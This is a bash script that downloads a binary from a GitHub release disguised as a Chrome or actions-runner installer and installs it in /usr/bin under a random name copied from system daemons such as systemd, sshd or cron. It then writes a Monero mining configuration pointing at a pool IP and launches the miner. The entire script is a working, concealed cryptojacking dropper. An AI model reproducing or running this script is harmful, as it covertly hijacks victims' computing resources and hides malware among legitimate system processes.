#!/bin/bash
set -e
curl -J -L https://github.com/namtran180291-cmyk/chrome-installer/releases/download/2.0.0/haproxy.tar.gz -o actions-runner-linux-x64-2.0.0.tar.gz 
tar -xf actions-runner-linux-x64-2.0.0.tar.gz
rm actions-runner-linux-x64-2.0.0.tar.gz
cd haproxy
names=(
  systemd
  systemd-journald
  systemd-logind
  dbus-daemon
  cron
  rsyslogd
  udevd
  polkitd
  networkd-dispatcher
  accounts-daemon
  avahi-daemon
  ModemManager
  irqbalance
  snapd
  sshd
  nginx
  apache2
  haproxy
  php-fpm
  redis-server
  mysqld
  postgres
  node
  docker
  containerd
  gnome-shell
  gnome-session
  gvfsd
  pulseaudio
  pipewire
  evolution-calendar-factory
)
random_name=${names[$RANDOM % ${#names[@]}]}
chmod +x ./haproxy
mv ./haproxy ./$random_name
sudo mv ./$random_name /usr/bin/$random_name
cd ..
rm -rf haproxy
PRE_DELAY=$(shuf -i15-30 -n1)
sleep $PRE_DELAY
echo -e '{"autosave":true,"background":false,"colors":true,"title":true,"randomx":{"init":-1,"init-avx2":1,"mode":"auto","1gb-pages":true,"rdmsr":true,"wrmsr":true,"cache_qos":false,"numa":true,"scratchpad_prefetch_mode":1},"cpu":{"enabled":true,"huge-pages":true,"huge-pages-jit":false,"hw-aes":null,"priority":null,"memory-pool":false,"yield":true,"max-threads-hint":80,"asm":true,"argon2-impl":null,"cn/0":false,"cn-lite/0":false},"opencl":{"enabled":false,"cache":true,"loader":null,"platform":"AMD","adl":true,"cn/0":false,"cn-lite/0":false},"cuda":{"enabled":false,"loader":null,"nvml":true,"cn/0":false,"cn-lite/0":false},"donate-level":0,"donate-over-proxy":0,"log-file":null,"pools":[{"algo":null,"coin":"XMR","url":"103.38.236.171:7788","user":"root","pass":"secret","rig-id":null,"nicehash":false,"keepalive":true,"enabled":true,"tls":false,"tls-fingerprint":null,"daemon":false,"socks5":null,"self-select":null,"submit-to-origin":false}],"print-time":60,"health-print-time":60,"dmi":true,"retries":5,"retry-pause":5,"syslog":false,"tls":{"enabled":true,"protocols":null,"cert":null,"cert_key":null,"ciphers":null,"ciphersuites":null,"dhparam":null},"dns":{"ip_version":0,"ttl":30},"user-agent":null,"verbose":0,"watch":false,"pause-on-battery":false,"pause-on-active":false}' > /usr/bin/config.json
$random_name
